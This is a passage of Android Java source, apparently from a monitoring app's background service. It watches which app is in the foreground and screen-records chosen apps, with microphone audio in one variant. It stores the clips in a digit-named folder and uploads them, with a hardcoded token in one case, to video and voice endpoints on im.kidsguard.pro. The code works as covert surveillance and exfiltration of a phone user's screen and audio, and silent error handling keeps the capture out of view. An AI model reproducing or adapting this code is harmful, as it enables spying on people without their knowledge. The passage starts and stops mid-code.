                        (Context.MEDIA_PROJECTION_SERVICE);
                mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
                mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath(),"468545878548");
                if (!file.exists()){file.mkdirs();}
                SimpleDateFormat formatter = new SimpleDateFormat("yyyy_MM_dd_HH_mm_ss", Locale.US);
                Date now = new Date();
//            mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                mMediaRecorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/"+curedate+".mp4");
                mMediaRecorder.setVideoSize(DISPLAY_WIDTH,DISPLAY_HEIGHT);
                mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
                // mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                mMediaRecorder.setVideoEncodingBitRate(512 * 1000);
                mMediaRecorder.setVideoFrameRate(30);
                mMediaRecorder.prepare();
            }catch (Exception e1){}
            Log.e("324", "initRecorder: "+e.toString() );
         //   Toast.makeText(this, "initRecorder: "+e.toString(), Toast.LENGTH_SHORT).show();
            e.printStackTrace();
        }
    }
    private void createMediaRecorder() {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.getDefault());

//        String curTime = formatter.format(curDate).replace(" ", "");
        String videoQuality = "HD";
//        if (isVideoSd) {
//            videoQuality = "SD";
//        }

        Log.i(TAG, "Create MediaRecorder");
       // MediaRecorder mediaRecorder = new MediaRecorder();
//        if (isAudio) {
       mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        //}
        mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
        mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mMediaRecorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/a.mp4");
        mMediaRecorder.setVideoSize(DISPLAY_WIDTH, DISPLAY_HEIGHT);  //after setVideoSource(), setOutFormat()
        mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);  //after setOutputFormat()
//        if (isAudio) {
        mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);  //after setOutputFormat()
       // }
        int bitRate;
//        if (isVideoSd) {
        mMediaRecorder.setVideoEncodingBitRate(DISPLAY_WIDTH* DISPLAY_HEIGHT);
        mMediaRecorder.setVideoFrameRate(30);
            bitRate = DISPLAY_WIDTH* DISPLAY_HEIGHT / 1000;
//        } else {
//            mediaRecorder.setVideoEncodingBitRate(5 * DISPLAY_WIDTH* DISPLAY_HEIGHT);
//            mediaRecorder.setVideoFrameRate(60); //after setVideoSource(), setOutFormat()
//            bitRate = 5 *DISPLAY_WIDTH* DISPLAY_HEIGHT / 1000;
//        }
        try {
            mMediaRecorder.prepare();
        } catch (IllegalStateException | IOException e) {
            Log.e(TAG, "createMediaRecorder: e = " + e.toString());
        }
        //Log.i(TAG, "Audio: " + isAudio + ", SD video: " + isVideoSd + ", BitRate: " + bitRate + "kbps");

        //return mediaRecorder;
    }
    private void createMediaRecorder2() {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.getDefault());
//        Date curDate = new Date(System.currentTimeMillis());
        Log.i(TAG, "Create MediaRecorder");
        mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
        mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mMediaRecorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/a.mp4");
        mMediaRecorder.setVideoSize(DISPLAY_WIDTH, DISPLAY_HEIGHT);  //after setVideoSource(), setOutFormat()
        mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);  //after setOutputFormat()
        mMediaRecorder.setVideoEncodingBitRate(DISPLAY_WIDTH* DISPLAY_HEIGHT);
        mMediaRecorder.setVideoFrameRate(30);


        try {
            mMediaRecorder.prepare();
        } catch (IllegalStateException | IOException e) {
            Log.e(TAG, "createMediaRecorder: e = " + e.toString());
        }

    }
    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    private void shareScreen() {
        if (mMediaProjection==null){
        try {
            mMediaProjectionCallback = new MediaProjectionCallback();
            mMediaProjection = mProjectionManager.getMediaProjection(resultCode,resultData);
            mMediaProjection.registerCallback(mMediaProjectionCallback, null);
            mVirtualDisplay = createVirtualDisplay();
            mMediaRecorder.start();
            record=true;
        }catch (Exception e){
            Log.e("324", e.toString() );

       //     Toast.makeText(this, "shareScreen:"+e.toString(), Toast.LENGTH_SHORT).show();
            exe=true;
//            Toast.makeText(this, String.valueOf(exe), Toast.LENGTH_SHORT).show();
            //mMediaRecorder.stop();
//            try {
//                mMediaRecorder.stop();
//
//            }catch (IllegalStateException s){
//                Log.e("return232", s.toString());
//            }
//            mMediaRecorder.reset();
//            stopScreenSharing();
//            if (mMediaProjection != null) {
//                mMediaProjection.unregisterCallback(mMediaProjectionCallback);
//                mMediaProjectionCallback=null;
//                mMediaProjection.stop();
//                mMediaProjection = null;
//                Runtime.getRuntime().gc();
//            }
//            mMediaRecorder=null;
//            mMediaRecorder = new MediaRecorder();
//            mProjectionManager = (MediaProjectionManager) getSystemService
//                    (Context.MEDIA_PROJECTION_SERVICE);
//            createMediaRecorder2();
//            //initRecorder();
//            shareScreen();
        }
    }
    }
    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    private VirtualDisplay createVirtualDisplay() {
        try {
            return mMediaProjection.createVirtualDisplay("Captureservice",
                    DISPLAY_WIDTH, DISPLAY_HEIGHT, mScreenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    mMediaRecorder.getSurface(), null /*Callbacks*/, null
                    /*Handler*/);
        }catch (Exception e){
        //    Toast.makeText(this, "createVirtualDisplay:"+e.toString(), Toast.LENGTH_SHORT).show();
            Log.e("324", "createVirtualDisplay: " + e.toString() );
            return null;
        }

    }

//    @Override
//    public void onProgress(Context context, UploadInfo uploadInfo) {
//
//    }
//
//    @Override
//    public void onError(Context context, UploadInfo uploadInfo, ServerResponse serverResponse, Exception exception) {
//        //uploading=false;
//        try {
//
//            File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
//            if (file.exists()){
//                File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
//                copy(file,fileb);
////                Handler handler=new Handler();
////                handler.postDelayed(new Runnable() {
////                    @Override
////                    public void run() {
////                       if (file.exists()){
////                           file.delete();
////                       }
////                    }
////                },2000);
//
//
//            }
//
//        }catch (Exception e){
//
//        }
//    }
//
//
//
//    @Override
//    public void onCompleted(Context context, UploadInfo uploadInfo, ServerResponse serverResponse) {
//       // uploading=false;
//     //   Toast.makeText(context, serverResponse.getBodyAsString(), Toast.LENGTH_SHORT).show();
//        try {
//
////        if (filec.exists()){
////            filec.delete();
////        }
//    }catch (Exception e){
//
//    }
//    }
//
//    @Override
//    public void onCancelled(Context context, UploadInfo uploadInfo) {
//      //  uploading=false;
//        try {
//
//            File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
//            if (file.exists()){
//                File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
//                copy(file,fileb);
////                Handler handler=new Handler();
////                handler.postDelayed(new Runnable() {
////                    @Override
////                    public void run() {
////                       if (file.exists()){
////                           file.delete();
////                       }
////                    }
////                },2000);
//
//
//            }
//
//        }catch (Exception e){
//
//        }
//
//    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    private class MediaProjectionCallback extends MediaProjection.Callback {
        @Override
        public void onStop() {

            mMediaRecorder.stop();
            mMediaRecorder.reset();

            mMediaProjection = null;
            stopScreenSharing();
        }

    }
    @TargetApi(Build.VERSION_CODES.KITKAT)
    private void stopScreenSharing() {
        if (mVirtualDisplay == null) {
            return;
        }
        mVirtualDisplay.release();
        destroyMediaProjection();
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    private void destroyMediaProjection() {
        if (mMediaProjection != null) {
            mMediaProjection.unregisterCallback(mMediaProjectionCallback);
            mMediaProjectionCallback=null;
            mMediaProjection.stop();
            mMediaProjection = null;
//            Handler handler=new Handler();
//            handler.postDelayed(new Runnable() {
//                @Override
//                public void run() {
//                    try {
//
//
//                    File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/a.mp4");
//                    if (file.exists()){
//                        file.delete();
//                    }
//                    }catch (Exception e){
//
//                    }
//
//                }
//            },10000);
            Runtime.getRuntime().gc();
        }
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public void recored(ArrayList<String> pkg){
            curpkgname="";
            CurrentAppClass currentAppClass=new CurrentAppClass();
            curpkgname=currentAppClass.getTopAppName(childService.this);
        Log.e("324", curpkgname );
            if (curpkgname==""){
                curpkgname=pastpkgname;
                Log.e("whatsss2434", "rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr" );
            }
           // Log.e("whatsss2434", "["+curpkgname+"]:::"+String.valueOf(uploading)+":::"+String.valueOf(record));
        if (pkg.contains(curpkgname)&&record==false){
            Log.e("324", curpkgname );
            Date curDate = new Date(System.currentTimeMillis());

            curedate=curDate.toString();

        //    Toast.makeText(this, "strat recording:"+curpkgname+"\n"+"pastpackagename:"+pastpkgname, Toast.LENGTH_SHORT).show();
            Log.e("whatsss324fd", curedate );
            //mMediaRecorder=null;
            mMediaRecorder = new MediaRecorder();
            mProjectionManager = (MediaProjectionManager) getSystemService
                    (Context.MEDIA_PROJECTION_SERVICE);
//            Toast.makeText(this, String.valueOf(exe), Toast.LENGTH_SHORT).show();
            if (exe){
               // Toast.makeText(this, "tr", Toast.LENGTH_SHORT).show();
                iniRecorder2();
            }else {
                iniRecorder();}
           // iniRecorder();
            shareScreen();
            handler23=new Handler();
            runnable23=new Runnable() {
                @Override
                public void run() {
                    //                    change=false;
//                    Handler handler1=new Handler();
//                    handler1.post(new Runnable() {
//                        @Override
//                        public void run() {
//                            if (!pkg.contains(curpkgname)){
//                                change=true;
//                            }
//                            handler1.postDelayed(this::run,1000);
//                        }
//                    });
                    if (record==true){
                        record=false;
                //       Toast.makeText(childService.this, "stop record:"+pastpkgname+"\n current package:"+curpkgname, Toast.LENGTH_SHORT).show();
                        try {
                            mMediaRecorder.stop();

                        }catch (IllegalStateException s){
                //            Toast.makeText(childService.this, s.toString(), Toast.LENGTH_SHORT).show();
                            Log.e("324", "mMediaRecorder.stop:"+s.toString());
                        }
                        mMediaRecorder.reset();
                        stopScreenSharing();
                        destroyMediaProjection();
//

                        try {
                            curdate2 = curedate;
                            filec = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/" + curedate + ".mp4");


                            try {
                                new Thread(new Runnable() {
                                    @Override
                                    public void run() {
                                        HttpClient httpclient = new DefaultHttpClient();
                                        HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-video/");


                                        try {
                                            MultipartEntity entity = new MultipartEntity();

                                            try {
                                                entity.addPart("token1", new StringBody("allow", Charset.forName("UTF-8")));
                                                entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
                                                entity.addPart("type", new StringBody(pastpkgname, Charset.forName("UTF-8")));
                                            } catch (UnsupportedEncodingException e) {
                                                e.printStackTrace();
                                            }
                                            //File myFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/b.mp4", "video");
                                            FileBody fileBody = new FileBody(filec);
                                            entity.addPart("video", fileBody);
                                            Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
                                            //totalSize = entity.getContentLength();
                                            httppost.setEntity(entity);
                                            HttpResponse response = httpclient.execute(httppost);
                                            HttpEntity r_entity = response.getEntity();
                                            Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
                                            //responseString = EntityUtils.toString(r_entity);

                                        } catch (ClientProtocolException e) {
                                            Log.e("terkgkjjgjgj", e.toString());
                                            File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                            if (file2.exists()){
                                                File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                                try {
                                                    copy(file2,fileb);
                                                } catch (IOException ioException) {
                                                    ioException.printStackTrace();
                                                }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                            }
                                            //responseString = e.toString();
                                        } catch (IOException e) {
                                            Log.e("terkgkjjgjgj", e.toString());
                                            File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                            if (file2.exists()){
                                                File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                                try {
                                                    copy(file2,fileb);
                                                } catch (IOException ioException) {
                                                    ioException.printStackTrace();
                                                }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                            }
                                            //	responseString = e.toString();
                                        }
                                    }
                                }).start();


                            } catch (Exception e) {
                                Log.e("terkgkjjgjgj", e.toString() );
                            }
                        }catch (Exception e){
                            Log.e("terkgkjjgjgj", e.toString() );
                        }









//                    stop recording
                    }
                }
            };
            handler23.postDelayed(runnable23,60000);

        }else if (pkg.contains(curpkgname)&&pkg.contains(pastpkgname)){
            //doing nothing
        }else if (!pkg.contains(curpkgname)&&record==true){
            final String pkgname=pastpkgname;

            record=false;
       //     handler23.removeCallbacks(runnable23);
   //         Toast.makeText(this, "stop record:"+pastpkgname+"\n current package:"+curpkgname, Toast.LENGTH_SHORT).show();
            try {
                mMediaRecorder.stop();

            }catch (IllegalStateException s){
     //           Toast.makeText(this,"mMediaRecorder.stop"+ s.toString(), Toast.LENGTH_SHORT).show();
                Log.e("324", s.toString());
            }
            mMediaRecorder.reset();
            stopScreenSharing();
            destroyMediaProjection();
//

            try {
                curdate2=curedate;
                filec=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curedate+".mp4");


                try {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            HttpClient httpclient = new DefaultHttpClient();
                            HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-video/");


                            try {
                                MultipartEntity entity = new MultipartEntity();

                                try {
                                    entity.addPart("token1", new StringBody("allow", Charset.forName("UTF-8")));
                                    entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
                                    entity.addPart("type", new StringBody(pkgname, Charset.forName("UTF-8")));
                                } catch (UnsupportedEncodingException e) {
                                    e.printStackTrace();
                                }
                                File myFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/"+curedate+".mp4");
                                FileBody fileBody = new FileBody(myFile);
                                entity.addPart("video", fileBody);
                                Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
                                //totalSize = entity.getContentLength();
                                httppost.setEntity(entity);
                                HttpResponse response = httpclient.execute(httppost);
                                HttpEntity r_entity = response.getEntity();
                                Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
                                //responseString = EntityUtils.toString(r_entity);

                            } catch (ClientProtocolException e) {
                                Log.e("terkgkjjgjgj", e.toString());
                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                if (file2.exists()){
                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                    try {
                                        copy(file2,fileb);
                                    } catch (IOException ioException) {
                                        ioException.printStackTrace();
                                    }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                }
                                //responseString = e.toString();
                            } catch (IOException e) {
                                Log.e("terkgkjjgjgj", e.toString());
                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                if (file2.exists()){
                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                    try {
                                        copy(file2,fileb);
                                    } catch (IOException ioException) {
                                        ioException.printStackTrace();
                                    }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                }
                                //	responseString = e.toString();
                            }
                        }
                    }).start();


                } catch (Exception e) {
                }
            }catch (Exception e){}



//                String uploadId = UUID.randomUUID().toString();
//                uploadReceiver.setUploadID(uploadId);
////                Date curDate = new Date(System.currentTimeMillis());
//                Log.e("toooooooooooken", getToken(getApplicationContext()) );
//                new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-video/")
//                        .addFileToUpload(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/"+curedate+".mp4", "video") //Adding file
//                        .addParameter("token", getToken(getApplicationContext()))
//                        .addParameter("token1", "allow")
//                        .addParameter("type", pastpkgname)//Adding text parameter to the request
//                        .setMaxRetries(2)
//                        .setAutoDeleteFilesAfterSuccessfulUpload(true)
//                        .startUpload(); //Starting the upload
//                 //uploading=true;
//            } catch (MalformedURLException e) {
//             //   uploading=false;
//     //           Toast.makeText(this, e.toString(), Toast.LENGTH_SHORT).show();
//                Log.e("exeption343", e.toString() );
//                e.printStackTrace();
//            } catch (FileNotFoundException e) {
//              //  uploading=false;
//     //           Toast.makeText(this, e.toString(), Toast.LENGTH_SHORT).show();
//                Log.e("exeption343", e.toString() );
//                e.printStackTrace();
//            }
//                    stop recording
        }
        pastpkgname=curpkgname;

    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public void recored23(String pkgname){

        if (curpkgname.equals(pkgname)&&!pastpkgname.equals(pkgname)){
            mMediaRecorder = new MediaRecorder();
            mProjectionManager = (MediaProjectionManager) getSystemService
                    (Context.MEDIA_PROJECTION_SERVICE);
          //  initRecorder();
            shareScreen();

        }else if (curpkgname.equals(pkgname)&&pastpkgname.equals(pkgname)){
            //doing nothing
        }else if (!curpkgname.equals(pkgname)&&pastpkgname.equals(pkgname)){
            try {
                mMediaRecorder.stop();

            }catch (IllegalStateException s){
                Log.e("return232", s.toString());
            }
            mMediaRecorder.reset();
            stopScreenSharing();
            destroyMediaProjection();
//
            try {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        HttpClient httpclient = new DefaultHttpClient();
                        HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-video/");


                        try {
                            MultipartEntity entity = new MultipartEntity();

                            try {
                                entity.addPart("token1", new StringBody("allow", Charset.forName("UTF-8")));
                                entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
                            } catch (UnsupportedEncodingException e) {
                                e.printStackTrace();
                            }
                            File myFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/a.mp4");
                            FileBody fileBody = new FileBody(myFile);
                            entity.addPart("video", fileBody);
                            Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
                            //totalSize = entity.getContentLength();
                            httppost.setEntity(entity);
                            HttpResponse response = httpclient.execute(httppost);
                            HttpEntity r_entity = response.getEntity();
                            Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
                            //responseString = EntityUtils.toString(r_entity);

                        } catch (ClientProtocolException e) {
                            Log.e("terkgkjjgjgj", e.toString());
                            File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                            if (file2.exists()){
                                File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                try {
                                    copy(file2,fileb);
                                } catch (IOException ioException) {
                                    ioException.printStackTrace();
                                }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                            }
                            //responseString = e.toString();
                        } catch (IOException e) {
                            Log.e("terkgkjjgjgj", e.toString());
                            File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                            if (file2.exists()){
                                File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                try {
                                    copy(file2,fileb);
                                } catch (IOException ioException) {
                                    ioException.printStackTrace();
                                }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                            }
                            //	responseString = e.toString();
                        }
                    }
                }).start();

            }catch (Exception e){}




//            try {
//                String uploadId = UUID.randomUUID().toString();
//                new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-video/")
//                        .addFileToUpload(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/a.mp4", "video") //Adding file
//                        .addParameter("token", getToken(getApplicationContext()))
//                        .addParameter("token1", "allow")//Adding text parameter to the request
//                        .setMaxRetries(2)
//
//                        .startUpload(); //Starting the upload
//            } catch (MalformedURLException e) {
//                e.printStackTrace();
//            } catch (FileNotFoundException e) {
//                e.printStackTrace();
//            }
//                    stop recording
        }
        pastpkgname=curpkgname;
    }
    @TargetApi(Build.VERSION_CODES.KITKAT)
    public void copy(File src, File dst) throws IOException {
        try {


        try (InputStream in = new FileInputStream(src)) {
            try (OutputStream out = new FileOutputStream(dst)) {
                // Transfer bytes from in to out
                byte[] buf = new byte[1024];
                int len;
                while ((len = in.read(buf)) > 0) {
                    out.write(buf, 0, len);
                }
            }
        }

        }catch (Exception e){}finally {
            File filw=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
        if (filw.exists()){
            filw.delete();
        }
        }
    }
    public void uploadfirstvoicefile(){
        File directory = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/45854455555/");
        if (directory.exists()){
            final File[] fileses = directory.listFiles();
            if (fileses.length>0){
                String uploadId = UUID.randomUUID().toString();

                try {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            HttpClient httpclient = new DefaultHttpClient();
                            HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-voice/");


                            try {
                                MultipartEntity entity = new MultipartEntity();

                                try {
                                    entity.addPart("token1", new StringBody("AllowVoice", Charset.forName("UTF-8")));
                                    entity.addPart("token", new StringBody("fb6741b31cb02c6079a542083b6a46a8", Charset.forName("UTF-8")));
                                } catch (UnsupportedEncodingException e) {
                                    e.printStackTrace();
                                }
                                //  File myFile = new File(path);
                                FileBody fileBody = new FileBody(fileses[0]);
                                entity.addPart("video", fileBody);
                                Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
                                //totalSize = entity.getContentLength();
                                httppost.setEntity(entity);
                                HttpResponse response = httpclient.execute(httppost);
                                HttpEntity r_entity = response.getEntity();
                                Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
                                //responseString = EntityUtils.toString(r_entity);

                            } catch (ClientProtocolException e) {
                                Log.e("terkgkjjgjgj", e.toString());
                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                if (file2.exists()){
                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                    try {
                                        copy(file2,fileb);
                                    } catch (IOException ioException) {
                                        ioException.printStackTrace();
                                    }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                }
                                //responseString = e.toString();
                            } catch (IOException e) {
                                Log.e("terkgkjjgjgj", e.toString());
                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                if (file2.exists()){
                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                    try {
                                        copy(file2,fileb);
                                    } catch (IOException ioException) {
                                        ioException.printStackTrace();
                                    }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                }
                                //	responseString = e.toString();
                            }
                        }
                    }).start();

                }catch (Exception e){}

                try {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            HttpClient httpclient = new DefaultHttpClient();
                            HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-voice/");


                            try {
                                MultipartEntity entity = new MultipartEntity();

                                try {
                                    entity.addPart("token1", new StringBody("AllowVoice", Charset.forName("UTF-8")));
                                    entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
                                } catch (UnsupportedEncodingException e) {
                                    e.printStackTrace();
                                }
                                // File myFile = new File(path);
                                FileBody fileBody = new FileBody(fileses[0]);
                                entity.addPart("voice", fileBody);
                                Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
                                //totalSize = entity.getContentLength();
                                httppost.setEntity(entity);
                                HttpResponse response = httpclient.execute(httppost);
                                HttpEntity r_entity = response.getEntity();
                                Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
                                //responseString = EntityUtils.toString(r_entity);

                            } catch (ClientProtocolException e) {
                                Log.e("terkgkjjgjgj", e.toString());
                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                if (file2.exists()){
                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                    try {
                                        copy(file2,fileb);
                                    } catch (IOException ioException) {
                                        ioException.printStackTrace();
                                    }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                }
                                //responseString = e.toString();
                            } catch (IOException e) {
                                Log.e("terkgkjjgjgj", e.toString());
                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                if (file2.exists()){
                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                    try {
                                        copy(file2,fileb);
                                    } catch (IOException ioException) {
                                        ioException.printStackTrace();
                                    }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                }
                                //	responseString = e.toString();
                            }
                        }
                    }).start();

                }catch (Exception e){}


//                try {
//                    new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-voice/")
//                            .addFileToUpload(fileses[0].getPath(), "voice") //Adding file
//                            .addParameter("token", getToken(getApplicationContext()))
//                            .addParameter("token1", "AllowVoice")//Adding text parameter to the request
//                            .setAutoDeleteFilesAfterSuccessfulUpload(true)
//                            .setMaxRetries(2)
//
//                            .startUpload(); //Starting the upload
//                } catch (FileNotFoundException e) {
//                    e.printStackTrace();
//                } catch (MalformedURLException e) {
//                    e.printStackTrace();
//                }
            }
        }
    }
    public void uploadfirstvoicefile2(){
        File directory = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/458544555433/");
        if (directory.exists()){
            final File[] fileses = directory.listFiles();
            if (fileses.length>0){

                try {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            HttpClient httpclient = new DefaultHttpClient();
                            HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-video/");


                            try {
                                MultipartEntity entity = new MultipartEntity();

                                try {
                                    entity.addPart("token1", new StringBody("allow", Charset.forName("UTF-8")));
                                    entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
                                } catch (UnsupportedEncodingException e) {
                                    e.printStackTrace();
                                }
                                //File myFile = new File(path);
                                FileBody fileBody = new FileBody(fileses[0]);
                                entity.addPart("video", fileBody);
                                Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
                                //totalSize = entity.getContentLength();
                                httppost.setEntity(entity);
                                HttpResponse response = httpclient.execute(httppost);
                                HttpEntity r_entity = response.getEntity();
                                Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
                                //responseString = EntityUtils.toString(r_entity);

                            } catch (ClientProtocolException e) {
                                Log.e("terkgkjjgjgj", e.toString());
                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                if (file2.exists()){
                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                    try {
                                        copy(file2,fileb);
                                    } catch (IOException ioException) {
                                        ioException.printStackTrace();
                                    }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                }
                                //responseString = e.toString();
                            } catch (IOException e) {
                                Log.e("terkgkjjgjgj", e.toString());
                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                if (file2.exists()){
                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                    try {
                                        copy(file2,fileb);
                                    } catch (IOException ioException) {
